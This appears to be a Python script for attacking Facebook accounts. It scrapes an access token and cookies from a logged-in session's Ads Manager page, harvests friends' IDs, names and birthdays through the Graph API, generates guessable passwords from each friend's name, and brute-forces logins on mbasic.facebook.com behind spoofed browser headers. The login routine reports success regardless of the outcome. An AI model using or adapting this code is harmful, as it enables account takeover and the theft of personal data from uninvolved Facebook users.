import requests
import re, time, os, json, random
from datetime import datetime
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

graph = lambda patch: 'https://graph.facebook.com/' + str(patch)
template = lambda status, data: {'status': status, 'date': datetime.now().strftime('%d/%m/%Y'), 'data': data, 'coder': {'name': 'errucha', 'github': 'https://github.com/jepluk'}}

class Facebook:
    def __init__(self, session):
        self.gyatt = session
        self.name = None
        self.id = None
        self.token = None

    def scrape_token(self) -> dict:
        try:
            wrizz = re.search(r'location\.replace\("(.*?)"\)', self.gyatt.get('https://adsmanager.facebook.com/adsmanager/manage').text).group(1)
            lrizz = re.search(r'__accessToken="(EAAB.*?)"', self.gyatt.get(wrizz.replace('\\','')).text).group(1)
            self.token = lrizz
            return template(True, {'token': lrizz, 'cookies': self.gyatt.cookies['cookie']})
        except AttributeError:
            return template(False, {})

    def dump_friendlist(self, id: str, token: str = None, cursor: str = None) -> dict:
        wrizz = self.gyatt.get(graph(id), params={'access_token': self.token if token is None else token, 'fields': 'name,friends.fields(id, name, birthday)' if cursor is None else +f'after({cursor})'}).json()
        try:
            aura = [(skibidi.values()) for skibidi in wrizz['data']['friends']]
            return template(True, {'friends': aura, 'name': wrizz['name'], 'cursor': wrizz['friends']['paging']['cursors']['after']})
        except KeyError:
            return template(False, {})

    def account_info(self, token: str = None):
        wrizz = self.gyatt.get(graph('me?fields=id,name&access_token='+ self.token if token is None else token)).json()
        try: 
            self.name = wrizz['name']
            self.id = wrizz['id']
            return template(True, {'name': wrizz['name'], 'id': wrizz['id'], 'token': self.token if token is None else token, 'cookies': self.gyatt.cookies['cookie']})
        except KeyError: 
            return template(False, {})


class Bruteforce:
    def __init__(self, id: str, name: str):
        self.id = id
        self.gyatt = requests.session()
        self.gyatt.headers.update({'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Encoding': 'gzip, deflate','Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','Content-Type': 'application/x-www-form-urlencoded','dpr': '2.25','Origin': 'https://mbasic.facebook.com','Referer': 'https://mbasic.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2F%3Fstype%3Dlo%26deoia%3D1%26jlou%3DAfdSmcCA6K0Mupy0d8n-B7KTXxEKX0HTxIY9EhjthO9sYUuBlD10HJ7nRDEWULlFzTaXSKHuPMCd0mhdXRQ032zGdaXk55-QgHCyetWMNvk8zg%26smuh%3D34845%26lh%3DAc8fz3ZmFcs0McAEcjQ%26refid%3D8%26ref_component%3Dmbasic_footer&refsrc=deprecated&refid=8&ref_component=mbasic_footer&_rdr','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="117", "Google Chrome";v="117"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'same-origin','Sec-Fetch-User': '?1','Upgrade-Insecure-Requests': '1','User-Agent': UserAgent().chrome,'viewport-width': '980'})
        self.skibidi = self.password_generator(name.lower())

    def password_generator(self, name: str):
        bet = [x+str(y) for x in name.split(' ') for y in [123, 1234, 12345, 321]] + [x+x for x in name.split(' ')] + [name]
        return bet

    def login(self, id: str, password: str):
        wrizz = BeautifulSoup(self.gyatt.get('https://mbasic.facebook.com/login/').text, 'html.parser').find('form')
        try:
            data = {x.get('name'): x.get('value') for x in wrizz('input')}
            data.update({'email': id, 'pass': password})
            del data['sign_up']
            lrizz = self.gyatt.post('https://mbasic.facebook.com/'+ wrizz['action'], data=data).text
            return template(True, {})
        except Exception as e:
            return template(False, {'error': str(e)})


        

    

        



        
        



                                    
